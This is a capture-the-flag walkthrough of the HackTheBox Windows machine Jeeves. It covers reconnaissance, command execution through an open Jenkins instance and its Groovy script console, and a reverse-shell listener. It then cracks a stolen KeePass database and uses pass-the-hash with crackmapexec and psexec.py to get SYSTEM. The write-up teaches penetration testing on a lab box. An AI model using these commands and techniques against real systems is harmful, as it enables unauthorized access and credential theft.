---
title: HTB: Jeeves
url: https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html
date: 2022-04-14T09:00:00+00:00
difficulty: Medium [30]
os: Windows
tags: htb-jeeves, hackthebox, ctf, nmap, windows, feroxbuster, gobuster, jetty, jenkins, keepass, kpcli, hastcat, passthehash, crackstation, psexec-py, alternative-data-streams, htb-object, oscp-plus-v1, oscp-like-v3
---

![Jeeves](https://0xdfimages.gitlab.io/img/jeeves-cover.png)

Jeeves was first released in 2017, and I first solved it in 2018. Four years later, it’s been an interesting one to revisit. Some of the concepts seem not that new and exciting, but it’s worth remembering that Jeeves was the first to do them. I’ll start with a webserver and find a Jenkins instance with no auth. I can abuse Jenkins to get execution and remote shell. From there, I’ll find a KeePass database, and pull out a hash that I can pass to get execution as Administrator. root.txt is actually hidden in an alternative data stream.

## Box Info

| Name | [Jeeves](https://hackthebox.com/machines/jeeves)  [Jeeves](https://hackthebox.com/machines/jeeves) [Play on HackTheBox](https://hackthebox.com/machines/jeeves) |
| --- | --- |
| Release Date | [11 Nov 2017](https://twitter.com/hackthebox_eu/status/928586727555518465) |
| Retire Date | 19 May 2018 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Jeeves |
| Radar Graph | Radar chart for Jeeves |
| First Blood User | 00:19:52[CTFPiggy CTFPiggy](https://app.hackthebox.com/users/11287) |
| First Blood Root | 03:53:41[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creator | [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` finds four open TCP ports, HTTP (80), SMB/RPC (135/445), and another Jetty webserver (50000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.63
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-12 21:44 UTC
Nmap scan report for 10.10.10.63
Host is up (0.10s latency).    
Not shown: 65531 filtered ports
PORT      STATE SERVICE
80/tcp    open  http 
135/tcp   open  msrpc       
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
                                                                    
Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
oxdf@hacky$ nmap -p 80,135,445,50000 -sCV -oA scans/nmap-tcpscripts 10.10.10.63
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-12 21:45 UTC
Nmap scan report for 10.10.10.63
Host is up (0.090s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-13T02:45:30
|_  start_date: 2022-04-13T02:43:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.53 seconds

```

SMB scripts show it’s Windows 7-10, and the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) suggests Windows 10 or Server 2016.

### Website - TCP 80

#### Site

The webserver returns a “Ask Jeeves” looking search engine:

![image-20220412175239965](https://0xdfimages.gitlab.io/img/image-20220412175239965.png)

Submitting anything is a GET request to `/error.html`. The value in the “Search here…” box isn’t even sent. The result is a simple page with a single image:

```

<img src="jeeves.PNG" width="90%" height="100%">

```

It looks like a ASP.NET error message about failing to connect to MSSQL:

![image-20220412175426757](https://0xdfimages.gitlab.io/img/image-20220412175426757.png)

This form doesn’t seem useful.

#### Tech Stack

The response headers show the page is hosted by IIS, but not much else of interest:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 06 Nov 2017 02:35:12 GMT
Accept-Ranges: bytes
ETag: "8ab5f9dea756d31:0"
Server: Microsoft-IIS/10.0
Date: Wed, 13 Apr 2022 02:52:48 GMT
Connection: close
Content-Length: 50

```

#### Directory Brute Force

`feroxbuster` also finds nothing of interest:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.63

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 56s    29999/29999   0s      found:0       errors:0      
[####################] - 56s    29999/29999   534/s   http://10.10.10.63 

```

### SMB - TCP 445

I’m not able to connect to SMB without creds:

```

oxdf@hacky$ smbclient -N -L //10.10.10.63
session setup failed: NT_STATUS_ACCESS_DENIED

```

### HTTP - TCP 50000

#### Site

The page on 50000 returns an error as well:

![image-20220412180522711](https://0xdfimages.gitlab.io/img/image-20220412180522711.png)

#### Tech Stack

The message in the page above and the HTTP response headers reference Jetty:

```

HTTP/1.1 404 Not Found
Connection: close
Date: Wed, 13 Apr 2022 03:05:02 GMT
Cache-Control: must-revalidate,no-cache,no-store
Content-Type: text/html;charset=iso-8859-1
Content-Length: 315
Server: Jetty(9.4.z-SNAPSHOT)

```

[Jetty](https://www.eclipse.org/jetty/) is a webserver built on Java made to host Java Servlets.

#### Directory Brute Force

`feroxbuster` doesn’t find anything here either:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.63:50000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt                                      
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 54s    29999/29999   0s      found:0       errors:0
[####################] - 54s    29999/29999   548/s   http://10.10.10.63:50000

```

`feroxbuster` by default uses the [SecLists](https://github.com/danielmiessler/SecLists) `raft-medium-directories.txt` wordlist, which is a pretty good approximation for what I should expect to find on HackTheBox today. Back in 2017, the go to wordlist was the [dirbuster](https://hackbbs.org/wordlists/dirbuster/) `directory-list-2.3-medium.txt` list. Looking at my notes from originally solving this box, that list finds something:

```

root@kali# gobuster -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.63:50000/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.php,.html
=====================================================
/askjeeves (Status: 302)

```

In HTB, for machines released recently, the `raft-medium-directories.txt` list is probably good enough… but it’s a good reminder that in the real world (and on older HTB machines), it’s worth trying different wordlists.

#### /askjeeves

This page is an instance of Jenkins:

![image-20220412191421029](https://0xdfimages.gitlab.io/img/image-20220412191421029.png)

## Shell as kohsuke

### Execution Via Job [1]

#### Create a Job

I recently ran into using Jenkins to get execution for the [Object](/2022/02/28/htb-object.html#shell-as-oliver) machine from the HTB Uni CTF 2021. I’ll follow similar steps here. First, I’ll click “New Item”, and on the next form give it a name (doesn’t matter what, I’ll just use “0xdf”), and select “Freestyle Project” as the type.

The next form presents the configuration options:

![image-20220412191920059](https://0xdfimages.gitlab.io/img/image-20220412191920059.png)

At the bottom, I’ll “Add build step”, and select “Execute Windows batch command”:

![image-20220412192001348](https://0xdfimages.gitlab.io/img/image-20220412192001348.png)

I’ll start with `cmd /c whoami`:

![image-20220412192035783](https://0xdfimages.gitlab.io/img/image-20220412192035783.png)

I’ll click save, which takes me back to a dashboard for the job.

#### Run Job

In Object, Jenkins was configured such that “Build Now” was not an option. Here, it is:

![image-20220412192349820](https://0xdfimages.gitlab.io/img/image-20220412192349820.png)

Clicking that, it shows up in the build history (I clicked twice, oops):

![image-20220412192445024](https://0xdfimages.gitlab.io/img/image-20220412192445024.png)

Clicking on one and going to “Console Output” shows the results of the command:

![image-20220412192510899](https://0xdfimages.gitlab.io/img/image-20220412192510899.png)

### Execution Via Script Console [2]

From the main dashboard left menu, I’ll click “Manage Jenkins”:

![image-20220413062516108](https://0xdfimages.gitlab.io/img/image-20220413062516108.png)

A little over halfway down is “Script Console”:

![image-20220413062543265](https://0xdfimages.gitlab.io/img/image-20220413062543265.png)

It gives a box to put in Groovy scripts. To run a command on the host, I’ll enter `println "cmd.exe /c whoami".execute().text`, and click run:

![image-20220413063418051](https://0xdfimages.gitlab.io/img/image-20220413063418051.png)

### Shell

I’ll jump into [revshells.com](https://www.revshells.com/) and build a shell. I’ve had really good luck lately with Powershell #3 (Base64), so I’ll use that one.

To get a shell via the job, I’ll click “Configure” to get back to the job configuration, and update the batch command:

![image-20220412192838994](https://0xdfimages.gitlab.io/img/image-20220412192838994.png)

Or I can paste that directly into the Script Console:

![image-20220413063615149](https://0xdfimages.gitlab.io/img/image-20220413063615149.png)

Either way, I’ll run the listener with `rlwrap` to make the shell more usable, and then run the job. There’s a connection at the listener:

```

oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 445
Listening on 0.0.0.0 445
Connection received on 10.10.10.63 49676
whoami
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins\workspace\0xdf>

```

It doesn’t show the prompt until after the first command, but once I see “Connection received on [Jeeves IP]”, I know it’s there.

Despite running as kohsuke, I’m in a directory in the Administrator’s home directory. Still, I can’t access anything else in here. I’ll visit kohsuke’s desktop, and grab `user.txt`:

```

PS C:\Users\kohsuke\desktop> cat user.txt
e3232272************************

```

## Shell as Administrator

### Enumeration

There are no other users on the box besides administrator, so that’s the clear next target:

```

PS C:\Users> dir

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/3/2017  11:07 PM                Administrator
d-----        11/5/2017   9:17 PM                DefaultAppPool
d-----        11/3/2017  11:19 PM                kohsuke
d-r---       10/25/2017   4:46 PM                Public 

PS C:\Users> net user

User accounts for \\JEEVES
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
kohsuke                  
The command completed successfully.

```

Looking around kohsuke’s home directory, there’s a single file in the `Documents` folder:

```

PS C:\Users\kohsuke\Documents> ls

    Directory: C:\Users\kohsuke\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx 

```

That’s a [KeePass](https://keepass.info/) database, a local password manager.

### Exfil

On a Linux host, I could just use `nc` to send this back. On Windows, it’s a bit tricker. Still, there’s a webserver here, so I’ll copy the file into that directory:

```

PS C:\Users\Administrator\.jenkins\workspace\0xdf> copy \users\kohsuke\Documents\CEH.kdbx .
PS C:\Users\Administrator\.jenkins\workspace\0xdf> ls

    Directory: C:\Users\Administrator\.jenkins\workspace\0xdf

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx  

```

Now clicking on “Workspace” in the Jenkins GUI shows the file:

![image-20220412205920650](https://0xdfimages.gitlab.io/img/image-20220412205920650.png)

Once I download it, I’ll delete it from the directory:

```

PS C:\Users\Administrator\.jenkins\workspace\0xdf> del CEH.kdbx 

```

### Crack Master Password

With KeePass, to get things out of the database, I need the master password. I’ll use the `keepass2john` script to create a hash the represents the password:

```

oxdf@hacky$ keepass2john CEH.kdbx 
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
oxdf@hacky$ keepass2john CEH.kdbx > CEH.kdbx.hash

```

I’ll use `hashcat` to crack it. I’ll need the `--user` flag as the hash starts with `[username]:`. `hashcat` now can automatically detect the hash type (most of the time), and it works here:

```

$ /opt/hashcat-6.2.5/hashcat.bin CEH.kdbx.hash /usr/share/wordlists/rockyou.txt --user
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
...[snip]...
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
...[snip]...

```

The password is “moonshine1”.

### Extract Passwords

I’ll use `kpcli` to extract passwords from the KeePass database. To connect, I just give it the `kdb` file and enter the master password when prompted:

```

oxdf@hacky$ kpcli --kdb CEH.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>

```

`find .` will list all the passwords:

```

kpcli:/> find .
Searching for "." ...
 - 8 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

```

`show -f [num]` will print each of those passwords:

```

kpcli:/> show -f 0

 Path: /CEH/
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/> show -f 1

 Path: /CEH/
Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/> show -f 2

 Path: /CEH/
Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/> show -f 3

 Path: /CEH/
Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/> show -f 4

 Path: /CEH/
Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/> show -f 5

 Path: /CEH/
Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/> show -f 6

 Path: /CEH/
Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/> show -f 7

 Path: /CEH/
Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on

```

### Try Passwords

I’ll collect the ones that look like passwords into a list:

```

oxdf@hacky$ cat passwords 
12345
S1TjAtJHKsugh9oC4VZl
pwndyouall!
F7WhTrSFDKB6sxHU1cUn
lCEUnYPjNfIuPZSzOySA
Password

```

I’ll pass that to `crackmapexec` for the Administrator user, but none work:

```

oxdf@hacky$ crackmapexec smb 10.10.10.63 -u Administrator -p passwords 
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:12345 STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:pwndyouall! STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:Password STATUS_LOGON_FAILURE

```

### Try Hash

#### LM and NT Hashes

The first entry in the KeePass, “Backup”, provided what looks like a Windows hash:

```

aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

```

Windows will show hashes in the format `LM Hash:NT Hash`. LM is the much less secure hash format used in legacy Windows systems. It’s typically not used, but kept around for backwards compatibility. Many times, the LM hash for the blank password is stored, which is ignored by Windows but allows the field not to be empty. `aad3b435b51404eeaad3b435b51404ee` is the LM hash of the empty password.

#### Crack Failures

Because there’s no salting in NT hashes, I can submit them to [CrackStation](https://crackstation.net/), where they store *tons* of hashes for known passwords. It finds the empty LM hash, but doesn’t have anything for the NT hash:

![image-20220413072456310](https://0xdfimages.gitlab.io/img/image-20220413072456310.png)

#### Pass The Hash

Because of how Windows handles authentication, when you enter your password, it’s actually the hash of the password that the client sends to Windows. That means with the right client, you can just pass that hash directly. `crackmapexec` is one of those clients that can take a hash and try to auth with it, and it works:

```

oxdf@hacky$ crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00                                                    
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)

```

Now only is it successful, but it shows `(Pwn3d!)`, which means this account has admin access.

### Shell

With valid admin creds, I’ll use `psexec.py` to get a shell:

```

oxdf@hacky$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file KLAXsITe.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service xUyL on 10.10.10.63.....
[*] Starting service xUyL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

### root.txt

On Administrator’s desktop, there’s no `root.txt`, but rather a `hm.txt`:

```

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,519,215,616 bytes free
               
C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.

```

On thing to check in CTFs is for alternative data streams, which can be seen in `dir` with `/R`. `hm.txt` has a stream named `root.txt`:

```

C:\Users\Administrator\Desktop> dir /R
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,519,215,616 bytes free

```

The stream can be read by piping it into `more`:

```

C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4************************

```